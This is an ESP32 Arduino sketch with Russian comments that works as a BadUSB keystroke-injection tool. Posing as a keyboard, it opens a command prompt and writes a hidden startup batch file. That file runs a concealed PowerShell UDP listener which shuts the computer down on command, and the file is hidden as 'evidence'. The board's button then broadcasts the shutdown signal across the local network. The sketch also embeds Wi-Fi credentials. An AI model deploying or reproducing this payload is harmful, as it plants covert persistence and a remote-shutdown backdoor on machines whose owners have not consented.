#include <WiFi.h>
#include <WiFiUdp.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

// ==========================================
// ВАШИ ДАННЫЕ WI-FI (для кнопки BOOT)
// ==========================================
const char* ssid = "DIR-615T-0DBC";
const char* password = "23233010";

USBHIDKeyboard Keyboard;
WiFiUDP udp;

void setup() {
  // 1. Настройка кнопки BOOT и RGB
  pinMode(0, INPUT_PULLUP);
  pinMode(LED_RED, OUTPUT); pinMode(LED_GREEN, OUTPUT); pinMode(LED_BLUE, OUTPUT);
  digitalWrite(LED_RED, HIGH); digitalWrite(LED_GREEN, HIGH); digitalWrite(LED_BLUE, HIGH);

  // 2. Подготовка USB (BadUSB)
  USB.begin();
  Keyboard.begin();
  delay(3000); // Ждем, пока ПК распознает плату

  // 3. Принудительно переключаем раскладку на английскую (Win + Space)
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press(' '); delay(100); Keyboard.releaseAll(); delay(300);

  // 4. Открываем CMD через Win+R
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(100); Keyboard.releaseAll(); delay(500);
  Keyboard.print("cmd");
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(1000); // Ждем открытия консоли

  // 5. Создаем BAT-файл в автозагрузке (он будет слушать UDP порт 8080)
  Keyboard.print("echo start /min powershell -w hidden -c \"$u=New-Object System.Net.Sockets.UdpClient(8080); while($true){$e=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0);$d=$u.Receive([ref]$e); if([Text.Encoding]::ASCII.GetString($d) -eq 'SHUTDOWN'){shutdown /s /t 0}}\" > %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sys.bat");
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(1000);

  // 6. Проверка: если файл не создался — выводим ошибку
  Keyboard.print("if not exist \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sys.bat\" msg * \"Ошибка создания файла!\"");
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(500);

  // 7. Скрываем файл (улики) и запускаем прямо сейчас
  Keyboard.print("attrib +h \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sys.bat\" & start \"\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sys.bat\" & exit");
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(1000);

  // 8. Уведомление, что всё готово
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(100); Keyboard.releaseAll(); delay(500);
  Keyboard.print("msg * \"Система готова. Плату можно отключить.\"");
  delay(100);
  Keyboard.write(KEY_RETURN);
  delay(1000);

  Keyboard.end(); // Отключаем режим клавиатуры

  // 9. Подключаемся к Wi-Fi (в фоне), чтобы кнопка BOOT работала
  WiFi.begin(ssid, password);
}

void loop() {
  // Если нажата кнопка BOOT (LOW)
  if (digitalRead(0) == LOW) {
    delay(50); // Антидребезг
    if (digitalRead(0) == LOW) {

      // 1. Зажигаем красный светодиод
      digitalWrite(LED_RED, LOW);

      // 2. Отправляем UDP-сигнал на всю локальную сеть
      udp.beginPacket("255.255.255.255", 8080);
      udp.print("SHUTDOWN");
      udp.endPacket();

      // 3. Ждем 5 секунд
      delay(5000);

      // 4. Гасим светодиод
      digitalWrite(LED_RED, HIGH);

      // Ждем, пока кнопку отпустят
      while(digitalRead(0) == LOW) { delay(10); }
    }
  }
}
